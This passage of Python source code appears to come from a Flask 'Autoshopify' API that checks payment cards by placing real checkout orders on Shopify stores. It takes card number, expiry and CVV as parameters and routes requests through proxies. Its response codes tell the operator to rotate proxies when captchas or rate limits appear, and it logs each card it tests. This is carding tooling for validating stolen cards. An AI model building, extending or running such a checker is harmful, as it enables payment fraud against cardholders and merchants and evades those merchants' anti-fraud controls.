                    "cc": "4111111111111111|12|25|123"
                }
            }
        },
        "response_codes": {
            "ORDER_PLACED": "Card charged successfully — order placed",
            "CARD_DECLINED": "Card declined by bank",
            "INSUFFICIENT_FUNDS": "Card live but insufficient balance",
            "OTP_REQUIRED": "3DS / OTP authentication required",
            "ACTION_REQUIRED": "Additional action required by bank",
            "CAPTCHA_REQUIRED": "Site triggered captcha — retry with different proxy",
            "INVALID_NUMBER": "Invalid card number",
            "INVALID_EXPIRY": "Invalid expiry date",
            "INVALID_CVC": "Invalid CVV",
            "EXPIRED_CARD": "Card is expired",
            "STOLEN_CARD": "Card reported stolen",
            "FRAUDULENT": "Transaction flagged as fraudulent",
            "PAYMENT_FAILED": "Generic payment failure",
            "Site not supported": "Store does not support Shopify Payments",
            "Payment method not available": "Payment method unavailable on this store",
            "Site requires login": "Store requires login before checkout",
            "Throttled": "Rate limited — rotate proxy",
            "CAPTCHA_REQUIRED on submit": "Captcha triggered at payment submission step"
        },
        "credits": "Powered by @NullX — https://t.me/nullxchk_bot"
    }
    response = jsonify(info)
    response.headers['Content-Type'] = 'application/json'
    return response

@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        target_price_range = request.args.get('range')
        
        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False
            }), 400
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']
            mes = cc_parts['mes']
            ano = cc_parts['ano']
            cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400
        
        variant_id = request.args.get('variant')
        
        # Module-level thread-local loop reuse — one loop per Waitress thread,
        # rebuilt every 50 requests to prevent event loop exhaustion/corruption.
        if not hasattr(_thread_local, 'loop') or _thread_local.loop is None or _thread_local.loop.is_closed():
            _thread_local.loop = asyncio.new_event_loop()
            _thread_local.req_count = 0
            asyncio.set_event_loop(_thread_local.loop)

        _thread_local.req_count = getattr(_thread_local, 'req_count', 0) + 1
        if _thread_local.req_count >= 50:
            # Rebuild loop every 50 requests to flush accumulated state
            try:
                _thread_local.loop.close()
            except Exception:
                pass
            _thread_local.loop = asyncio.new_event_loop()
            _thread_local.req_count = 0
            asyncio.set_event_loop(_thread_local.loop)

        loop = _thread_local.loop
        
        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str, target_price_range)
            )
        except Exception as e:
            # Loop got corrupted — rebuild it next call
            try:
                _thread_local.loop.close()
            except Exception:
                pass
            _thread_local.loop = None
            raise e
        
        clean_response = extract_clean_response(message)
        
        response_data = {
            "Gateway": gateway,
            "Price": float(price) if str(price).replace('.', '', 1).isdigit() else 0.0,
            "Response": clean_response,
            "Status": success,
            "cc": cc_string
        }
        
        print(f"[API RESPONSE] cc={cc_string} -> Status={success} | Gateway={gateway} | Price={price} | Response={clean_response}")
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Autoshopify API Server')
    parser.add_argument('--port', type=int, default=5000, help='Port to run the API on')
    args = parser.parse_args()
    
    from waitress import serve
    print(f'[API] Starting Autoshopify API on port {args.port} (waitress, 100 threads, conn_limit=10000)...')
    serve(app, host='0.0.0.0', port=args.port, threads=100, connection_limit=10000, backlog=2048, channel_timeout=40, cleanup_interval=10)